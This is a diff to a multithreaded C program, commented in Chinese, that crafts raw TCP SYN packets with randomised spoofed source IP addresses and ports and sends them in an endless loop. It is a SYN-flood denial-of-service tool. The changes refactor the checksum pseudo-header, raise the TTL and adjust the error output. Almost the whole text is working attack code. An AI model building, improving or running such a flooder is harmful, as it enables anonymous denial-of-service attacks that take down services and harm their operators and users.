@@ -13,14 +13,12 @@
 #include <errno.h>
 
 //needed for checksum calculation
-struct pseudo_header_tcp {
+struct pseudo_header {
     unsigned int source_address;
     unsigned int dest_address;
     unsigned char placeholder;
     unsigned char protocol;
-    unsigned short tcp_length;
-
-    struct tcphdr tcp;
+    unsigned short tcp_or_udp_length;
 };
 
 //checksum is 16bit,should use unsigned short
@@ -71,7 +69,7 @@ void send_syn_packet() {
     ip_header->tot_len = sizeof(datagram);
     ip_header->id = 0;                      //自定 IP 包标识，方便筛选
     ip_header->frag_off = 0;
-    ip_header->ttl = 64;
+    ip_header->ttl = 255;
     ip_header->protocol = IPPROTO_TCP;      //指定承载的是 TCP 数据包
     ip_header->check = 0;                   //之后需要计算校验和
     // ip_header->saddr在for循环里动态修改
@@ -80,7 +78,7 @@ void send_syn_packet() {
 
     //放到下面的for循环去计算，因为在这里计算了也没用，某个字段修改后，还是要重新计算，浪费cpu资源
     //计算 ip 校验和，两个字节
-    //ip_header->check = calculate_checkcsum((unsigned short *) datagram, sizeof(struct iphdr));
+    //ip_header->check = calculate_checkcsum((unsigned short*) datagram, sizeof(datagram));
 
     // 填充 tcp 首部字段
     // tcp_header->source在for循环里动态修改
@@ -99,19 +97,21 @@ void send_syn_packet() {
     tcp_header->check = 0;                  //之后需要计算校验和
     tcp_header->urg_ptr = 0;
 
+    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
+    char *pseudogram = malloc(psize);
     //借助伪头部计算 tcp 校验和
-    struct pseudo_header_tcp psh;
+    struct pseudo_header *psh = (struct pseudo_header *) pseudogram;
     // psh.source_address在for循环里动态修改
     //psh.source_address = src_inet_addr;
-    psh.dest_address = dst_inet_addr;
-    psh.placeholder = 0;
-    psh.protocol = IPPROTO_TCP;
-    psh.tcp_length = sizeof(struct tcphdr);
+    psh->dest_address = dst_inet_addr;
+    psh->placeholder = 0;
+    psh->protocol = IPPROTO_TCP;
+    psh->tcp_or_udp_length = htons(sizeof(struct tcphdr));
     //放到下面的for循环去计算，因为在这里计算了也没用，某个字段修改后，还是要重新计算，浪费cpu资源
-    //memcpy(&psh.tcp, tcp_header, sizeof(struct tcphdr));
+    //memcpy(pseudogram+sizeof(struct pseudo_header_tcp), tcp_header, sizeof(struct tcphdr));
 
     //计算 tcp 校验和
-    //tcp_header->check = calculate_checkcsum((unsigned short *) &psh, sizeof(struct pseudo_header_tcp));
+    //tcp_header->check = calculate_checkcsum((unsigned short *) pseudogram, psize);
 
     //↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑至此，第一次握手的 TCP/IP 数据包构造完毕↑↑↑↑↑↑↑↑↑↑↑↑
 
@@ -123,7 +123,7 @@ void send_syn_packet() {
     unsigned short rand_src_port = src_port;
 
     for (;;) {
-        // for fatest speed
+        // for fastest speed
         if (src_inet_addr < 0 || src_port < 0) {
             rand_unsigned_int32 = (unsigned int) random();
             if (src_inet_addr < 0) {
@@ -139,17 +139,17 @@ void send_syn_packet() {
         ip_header->saddr = rand_src_ip;
 
         //计算 ip 校验和，两个字节
-        ip_header->check = calculate_checkcsum((unsigned short *) datagram, sizeof(struct iphdr));
+        ip_header->check = calculate_checkcsum((unsigned short *) datagram, sizeof(datagram));
 
         //******TCP首部******
         // 篡改源端口号 tcp_header->source
         tcp_header->source = htons(rand_src_port);
         //******pseudo_header*******
-        psh.source_address = rand_src_ip;
-        memcpy(&psh.tcp, tcp_header, sizeof(struct tcphdr));
+        psh->source_address = rand_src_ip;
+        memcpy(pseudogram + sizeof(struct pseudo_header), tcp_header, sizeof(struct tcphdr));
 
         //计算 tcp 校验和
-        tcp_header->check = calculate_checkcsum((unsigned short *) &psh, sizeof(struct pseudo_header_tcp));
+        tcp_header->check = calculate_checkcsum((unsigned short *) pseudogram, psize);
 
         //↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑至此，第一次握手的 TCP/IP 数据包构造完毕↑↑↑↑↑↑↑↑↑↑↑↑
 
@@ -159,8 +159,7 @@ void send_syn_packet() {
         );
 
         if (bytes_sent < 0) {
-            printf("ERROR(%d):", errno);
-            perror("Send datagram fail");
+            printf("ERROR(%d):%s\n", errno, strerror(errno));
         }
     }
 }
@@ -245,7 +244,7 @@ int main(int argc, char *argv[]) {
         pthread_create(&tids[j], NULL, (void *) send_syn_packet, NULL);
     }
     for (j = 0; j < thread_count; j++) {
-        pthread_join(tids[j],NULL);
+        pthread_join(tids[j], NULL);
     }
 
     // sockfd should close here !
